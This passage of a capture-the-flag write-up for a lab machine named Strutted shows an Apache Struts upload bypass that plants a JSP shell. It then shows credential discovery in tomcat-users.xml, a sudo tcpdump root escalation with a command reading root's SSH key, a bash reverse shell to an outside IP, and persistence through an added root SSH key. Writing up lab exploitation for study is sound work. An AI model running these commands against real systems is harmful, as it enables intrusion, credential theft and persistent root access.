    We also saw previously that the setter method is actual `setUpload` so this means the parameter name is actually `Upload` not `upload`.

    If we were to try to exploit the upload using `name="upload"` our additional form-data (like `top.UploadFileName`) gets ignored and the file is uploaded as usual to the default location, don't believe me look at the below image where I have not corrected the case to match the setter method.

    {{< figure src="/ox-hugo/2025-06-01-095854_.png" >}}

    So knowing this we know we need to modify the form data to read `name="Upload"` &#x2026;with a capital `U` like below.

    ```bash
    ------WebKitFormBoundarySETxW9w3w1WbVLqt
    Content-Disposition: form-data; name="Upload"; filename="shell.jsp"
    Content-Type: application/octet-stream
    ```


##### Getting RCE by accessing our malicious image/shell: {#getting-rce-by-accessing-our-malicious-image-shell}

Now that we have modified these if we send our payload we should bypass the upload restrictions, rename our file, put it in a folder that can be processed as code when called and get our shell

+Notes+: A word of warning: Ensure your Form-Data spacing is correct, it should look like the below
![](/ox-hugo/2025-06-01-144441_.png)

Once we upload our request we will see in the response it has been uploaded successfully.
![](/ox-hugo/2025-06-01-144207_.png)

If we now visit <http://strutted.htb/rev-shell.jsp> it will trigger our reverse shell and we will get a connection back to our attack machine.
![](/ox-hugo/2025-06-01-144310_.png)


### Enumerating As Tomcat: {#enumerating-as-tomcat}

Now we have access let's get enumerating for privilege Escalation paths.


#### Stabilizing Our Shell Using `script`: Upgrading Our Shell {#stabilizing-our-shell-using-script-upgrading-our-shell}

You can see the shell is very limited. After checking for python &amp; socat we find they are not present. However we can use `script` to stabilize our shell.

```shell
script /dev/null -c /bin/bash
```

{{< figure src="/ox-hugo/2025-06-01-145646_.png" >}}


#### Discovering the User James: {#discovering-the-user-james}

Checking the `/etc/passwd` file we can see the user James exists and the description field has the string "Network Administrator" and as there are not other users apart from root to go after I think he will be our next logically target.

Checking his home directory we cannot access it as expected.

Checking lastlog we can see that the only two users to ever login have been root &amp; james

```shell
lastlog | grep -v "**Never logged in**"
```

{{< figure src="/ox-hugo/2025-06-01-151355_.png" >}}


### Discovering James' SSH password in the `tomcat-users.xml` file. {#discovering-james-ssh-password-in-the-tomcat-users-dot-xml-file-dot}

After some manual enumeration if we check the `tomcat-users.xml` file in `/var/lib/tomcat9/conf` we can see that there is a password present.
![](/ox-hugo/2025-06-01-152732_.png)

If we try it with the found user name `james` for the SSH service we can access the host.
![](/ox-hugo/2025-06-01-153002_.png)

Let's grab our user flag.
![](/ox-hugo/2025-06-01-153153_.png)


## 4. Privilege Escalation: {#4-dot-privilege-escalation}


### Discovering James can run tcpdump as root: {#discovering-james-can-run-tcpdump-as-root}

As soon as I get on any nix machine the first port of call is always running `sudo -l` to see if our user can run any commands as `sudo`. Doing so we discover james can run `tcpdump` as root.
![](/ox-hugo/2025-06-01-153413_.png)

If we check [gtfobins](https://gtfobins.github.io/gtfobins/tcpdump/) we can see there is a clear privilege escalation path to root by abusing the sudo tcpdump privileges.


### Using `TCPDUMP` To Run Root Commands: {#using-tcpdump-to-run-root-commands}


#### Attempt 1: Copying The Root SSH key: {#attempt-1-copying-the-root-ssh-key}

1.  First we sets a variable called `COMMAND` with the command that we want to run, read the root ssh key and save it to a location we control
    ```shell
    COMMAND='cat /root/.ssh/id_rsa >> /home/james/key.txt'
    ```

2.  We create a temporary file using `mktemp`, and assigns the path to a variable `TF`.
    ```shell
    TF=$(mktemp)
    ```
    Example output: `/tmp/tmp.abc123`

3.  We now copy the content of the `COMMAND` variable into the temporary file `TF`. This writes the content of `COMMAND` into the file stored in `TF`.
    ```shell
    echo "$COMMAND" > $TF
    ```

4.  We make the temp file executable so it can be run as a script and executed.
    ```shell
    chmod +x $TF
    ```

5.  This is where the abuse of `tcpdump` happens (the magic).
    ```shell
    sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
    ```

    -   `sudo tcpdump` initiates the process as root.
    -   `-ln` â€“ disables name resolution for IPs and ports.
    -   `-i lo` â€“ captures on the loopback interface (`lo`).
        -   This interface is ALWAYS available.
    -   `-w /dev/null` â€“ write the capture to `/dev/null` as we don't actually need the `.pcap`.
    -   `-W 1` â€“ keeps only one capture file.
    -   `-G 1` â€“ rotates the capture file every 1 second (used with `-w` and `-z`).
    -   `-z $TF` â€“ tells `tcpdump` to run the `$TF` script (our malicious script) after rotating the file.
        -   Usually this flag would be used to compress the capture file post rotation.
    -   `-Z root` â€“ sets the user that runs the post-rotate script to `root`.

This is the key part to the exploit: the script in `$TF` is executed **as root** because of `-Z root`, allowing us to execute the commands in the context of root.

Checking to see if `key.txt` is now available and we can see the file is present.

If we check the content we can see it contains the ssh key of the root user.

Well well well after all that the root account still required a password when sshing in, so if you try and access with that key it will not work, instead lets give ourselves a reverse root shell using the same technique.


#### Attempt 2: Getting A Root Reverse Shell: {#attempt-2-getting-a-root-reverse-shell}

We use the same set of commands again, this time just modifying the malicious command.

```shell
COMMAND="bash -c 'bash -i >& /dev/tcp/10.10.14.183/9090 0>&1'"
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

+Note+: We are using a sub-shell e.g. `bash -c 'bash -i >& /dev/tcp/10.10.14.183/9090 0>&1'` as otherwise this will not execute correctly.

We get a call back to our listener.

Let's get our root flag.

## 5. Persistence: {#5-dot-persistence}


### Adding A Secondary Root SSH key: {#adding-a-secondary-root-ssh-key}

So typically what we could do is make a new user, however I am going to generate another key for the root user.

1.  Generate SSH Key for the User:
    ```shell
    ssh-keygen -t rsa -b 4096
    ```

{{< figure src="/ox-hugo/2025-06-01-172112_.png" >}}

1.  Copy Public Key to Authorized Keys:
    ```shell
    cp ~/.ssh/id_rsa2.pub ~/.ssh/authorized_keys
    ```

    -   This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user.

2.  Copy Private key to attack machine and put in it's own file.
    ```shell
    cat id_rsa2
    ```

3.  Change the mode of the key so the permissions are not too open:
    ```shell
    sudo chmod 400 id_rsa
    ```

4.  Verify it works:
    ```shell
    ssh -i id_rsa2 root@$box
    ```

## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  Honestly there are too numerous to list, however I was able to utilize a lot of the knowledge I have from working in devops here, especially maven, tomcat &amp; java.
2.  I also learned about apache struts which was fun.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Not so much silly, but it took a little research to realize about the case sensitivity of the setter method with OGNL, that held me up for a WHILE.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!
